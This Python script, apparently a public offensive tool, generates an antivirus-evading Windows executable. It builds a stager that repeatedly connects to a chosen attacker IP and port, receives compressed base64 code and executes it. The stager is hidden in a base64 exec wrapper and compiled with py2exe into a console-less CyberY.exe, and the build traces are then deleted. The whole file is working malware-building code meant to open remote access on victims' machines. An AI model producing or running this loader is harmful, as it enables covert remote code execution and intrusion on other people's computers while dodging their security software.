
# -*- coding: utf-8 -*-


#This simple python script to evade antiviruses on fully patched and updated Windows environments using a python then converted exe payload.
#Created by @0xCyberY

import base64, sys, os, shutil
import argparse
import textwrap 
from distutils.core import setup
import py2exe

# Setup the payload and add IP and Port.
def Create_payload( ip, port ):
        # Create the payload
        payload = "import socket,zlib,base64,struct,time\n"
        payload +="for x in range(10):\n"
        payload +="\ttry:\n"
        payload +="\t\ts=socket.socket(2,socket.SOCK_STREAM)\n"
        payload +="\t\ts.connect(('%s',%d))\n"%(ip, port)
        payload +="\t\tbreak\n"
        payload +="\texcept:\n"
        payload +="\t\ttime.sleep(5)\n"
        payload +="l=struct.unpack('>I',s.recv(4))[0]\n"
        payload +="d=s.recv(l)\n"
        payload +="while len(d)<l:\n"
        payload +="\td+=s.recv(l-len(d))\n"
        payload +="exec(zlib.decompress(base64.b64decode(d)),{'s':s})"
        return payload

# Encode the payload
def Encode_payload( payload ):
        # Retuen base64 encoded payload
        return base64.b64encode(payload.encode('utf-8'))

# Join all the payload
def Con_cat( encoded ):
        # Retuen encoded payload with required libraries 
        return "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('%s')[0]))"%(encoded)

# Write the payload to file
def write_file( join ):
        # Open file with write permission
        file = open("CyberY.py", "w")
        file.write(join)
        # Close the file
        file.close()

# Convert python to exe file 'py2exe'
def Setup():
        setup(
        name = 'CyberY',
        description = 'python to exe payload',
        version = '1.0',
        #console=['CyberY.py'],#remove black screen (python console)
        windows = [{'script': "CyberY.py"}],
        options = {'py2exe': {'bundle_files': 1,'packages':'ctypes','includes': 'base64,sys,socket,struct,time,code,platform,getpass,shutil',}},
        zipfile = None,
        )

def Clean_up():
        if (os.path.exists("./dist/CyberY.exe")):
            shutil.move("./dist/CyberY.exe", ".")
            shutil.rmtree("./dist")
            shutil.rmtree("./build")
            os.remove("./CyberY.py")
            print("Successful")

# Banner
def print_banner():
        print("""\t\t\t\tAntivirus Evasion Py2exe\n ,.      .                         ,--.                         ;-.      ,-.              
/  \     |   o     o               |                o           |  )        )             
|--| ;-. |-  . . , . ;-. . . ,-.   |-   . , ,-: ,-. . ,-. ;-.   |-'  . .   /  ,-. . , ,-. 
|  | | | |   | |/  | |   | | `-.   |    |/  | | `-. | | | | |   |    | |  /   |-'  X  |-' 
'  ' ' ' `-' ' '   ' '   `-` `-'   `--' '   `-` `-' ' `-' ' '   '    `-| '--' `-' ' ` `-' 
                                                                     `-'                  """)

#Main function

if __name__ == '__main__':
        # Try block
        try:
                # Print banner
                print_banner()
                # create a command line interface.
                parser = argparse.ArgumentParser(description='Antivirus Evasion Py2exe',
                formatter_class=argparse.RawDescriptionHelpFormatter,
                epilog=textwrap.dedent('''Example:\n\tC:\\>python aepy2exe.py -ip <ip_address> -p <port>\n\tC:\\>python aepy2exe.py -e py2exe -ip 192.168.1.10 -p 443'''))
                parser.add_argument('-ip', '--attacker_ip', default='192.168.1.10', help='specified attacker IP')        
                parser.add_argument('-p', '--port', type=int, default=443, help='specified attcaker port')
                args = parser.parse_args()
                #ip argument.
                ip = args.attacker_ip
                #port argument.
                port = args.port
                # call Gen_payload fun. add pass ip and port.
                payload = Create_payload( ip , port )
                # call Encode_payload fun. and pass payload.
                encoded = Encode_payload( payload )
                # call Join_all fun. and pass encoded.
                join = Con_cat( encoded )
                # Call write dun. to write payload into file.
                write_file(join)
                # Delete all arguemunts.
                del sys.argv[1:]
		# Append py2exe argument for Setup fun.
		sys.argv.append("py2exe")
                # Call setup fun. to convert pyton to exe.
                Setup()
                # Call Clean up fun.
                Clean_up()
        except Exception as e:
                # Print exception.
                print( e )
